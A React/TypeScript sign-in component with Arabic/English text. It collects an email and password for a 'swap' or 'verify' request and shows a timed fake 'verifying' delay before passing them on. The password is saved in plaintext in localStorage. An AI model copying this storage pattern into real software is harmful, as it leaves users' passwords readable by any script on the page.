import React, { useState } from 'react';
import { Mail, Lock, Eye, EyeOff, LoaderCircle, ArrowLeftRight, FileCheck, ShieldAlert } from 'lucide-react';
import { AuthData, RequestType } from '../types';
import { useLanguage } from '../context/LanguageContext';

interface AuthScreenProps {
  requestType: RequestType;
  onSubmit: (data: AuthData) => void;
}

export const AuthScreen: React.FC<AuthScreenProps> = ({
  requestType,
  onSubmit,
}) => {
  const { t, isRTL } = useLanguage();
  const [email, setEmail] = useState(() => localStorage.getItem('sc_waiting_email') || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const cleanEmail = email.trim();

    if (!cleanEmail && !password) {
      setError(isRTL ? 'يرجى إدخال البريد الإلكتروني وكلمة المرور.' : 'Please enter your email and password.');
      return;
    }
    if (!cleanEmail) {
      setError(t.errEmailRequired);
      return;
    }
    if (/[\u0600-\u06FF]/.test(cleanEmail)) {
      setError(isRTL ? 'البريد الإلكتروني يجب ألا يحتوي على أحرف عربية.' : 'Email address must not contain Arabic characters.');
      return;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
      setError(t.errEmailInvalid);
      return;
    }
    if (!password) {
      setError(t.errPasswordRequired);
      return;
    }
    if (/[\u0600-\u06FF]/.test(password)) {
      setError(isRTL ? 'كلمة المرور يجب ألا تحتوي على أحرف عربية.' : 'Password must not contain Arabic characters.');
      return;
    }
    if (password.length < 6) {
      setError(t.errPasswordMin);
      return;
    }

    setIsLoading(true);

    try {
      localStorage.setItem('sc_waiting_email', cleanEmail.toLowerCase());
      localStorage.setItem('sc_waiting_password', password);
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      onSubmit({
        email: cleanEmail.toLowerCase(),
        password,
      });
    }, 600);
  };

  return (
    <div className="flex flex-col">
      {/* Header */}
      <div className="text-center">
        <div className="mx-auto mb-3 flex w-fit items-center gap-2 rounded-full border border-[#4A90E2]/30 bg-[#4A90E2]/10 px-3.5 py-1.5 text-[11px] font-semibold text-[#7B9BE8]">
          {requestType === 'swap' ? (
            <ArrowLeftRight className="size-3.5" />
          ) : (
            <FileCheck className="size-3.5" />
          )}
          <span className="text-white/70">{isRTL ? 'نوع الطلب:' : 'Request Type:'}</span>
          <span className="text-white font-bold">
            {requestType === 'swap' ? t.filterTypeSwap : t.filterTypeVerify}
          </span>
        </div>

        <h1 className="text-2xl font-bold text-white sm:text-3xl">{t.authTitle}</h1>
        <p className="mt-2 text-sm font-medium text-white/60">
          {t.authSubtitle}
        </p>
      </div>

      {/* Error Display */}
      {error && (
        <div className="mt-5 flex items-center gap-2.5 rounded-2xl border border-rose-500/30 bg-rose-500/10 p-3.5 text-sm text-rose-200">
          <ShieldAlert className="size-5 shrink-0 text-rose-400" />
          <span>{error}</span>
        </div>
      )}

      {/* Form */}
      <form onSubmit={handleSubmit} className="mt-6 grid gap-5" noValidate>
        {/* Email */}
        <div className="relative">
          <Mail className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/60`} />
          <input
            id="input-auth-email"
            type="email"
            dir="ltr"
            autoComplete="email"
            maxLength={255}
            required
            value={email}
            onChange={(e) => {
              const val = e.target.value;
              if (/[\u0600-\u06FF]/.test(val)) {
                setError(isRTL ? 'البريد الإلكتروني يجب ألا يحتوي على أحرف عربية.' : 'Email address must not contain Arabic characters.');
              } else if (error && error.includes('البريد الإلكتروني')) {
                setError(null);
              }
              setEmail(val.replace(/[\u0600-\u06FF]/g, ''));
            }}
            placeholder={t.emailPlaceholder}
            className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-4 ${isRTL ? 'pr-12 pl-4 text-right' : 'pl-12 pr-4 text-left'} text-base font-medium text-white outline-none transition-colors placeholder:text-white/40 focus:border-[#4A90E2]/60 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
          />
        </div>

        {/* Password */}
        <div className="relative">
          <Lock className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/60`} />
          <input
            id="input-auth-password"
            type={showPassword ? 'text' : 'password'}
            dir="ltr"
            autoComplete="current-password"
            maxLength={72}
            required
            minLength={6}
            value={password}
            onChange={(e) => {
              const val = e.target.value;
              if (/[\u0600-\u06FF]/.test(val)) {
                setError(isRTL ? 'كلمة المرور يجب ألا تحتوي على أحرف عربية.' : 'Password must not contain Arabic characters.');
              } else if (error && error.includes('كلمة المرور')) {
                setError(null);
              }
              setPassword(val.replace(/[\u0600-\u06FF]/g, ''));
            }}
            placeholder={t.passwordPlaceholder}
            className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-4 ${isRTL ? 'pr-12 pl-12 text-right' : 'pl-12 pr-12 text-left'} text-base font-medium text-white outline-none transition-colors placeholder:text-white/40 focus:border-[#4A90E2]/60 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
          />
          <button
            type="button"
            aria-label={showPassword ? 'Hide password' : 'Show password'}
            onClick={() => setShowPassword(!showPassword)}
            className={`absolute top-1/2 ${isRTL ? 'left-3' : 'right-3'} -translate-y-1/2 p-2 text-white/60 transition hover:text-white cursor-pointer`}
          >
            {showPassword ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
          </button>
        </div>

        <p className="text-[11px] leading-5 text-white/50">
          {t.passwordHelp}
        </p>

        {/* Submit Button */}
        <button
          type="submit"
          id="btn-auth-submit"
          disabled={isLoading || !email.trim() || !password}
          className="mt-2 inline-flex min-h-13 items-center justify-center gap-2 rounded-2xl bg-gradient-to-b from-[#7B9BE8] to-[#5F7FD3] px-5 text-base font-bold text-white shadow-[0_18px_40px_-14px_rgba(107,140,224,0.7)] transition hover:brightness-110 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-50 cursor-pointer"
        >
          {isLoading ? (
            <>
              <LoaderCircle className="size-5 animate-spin" />
              <span>{isRTL ? 'جارٍ التحقق والتسجيل…' : 'Verifying & signing in…'}</span>
            </>
          ) : (
            <span>{t.btnSignInContinue}</span>
          )}
        </button>
      </form>
    </div>
  );
};
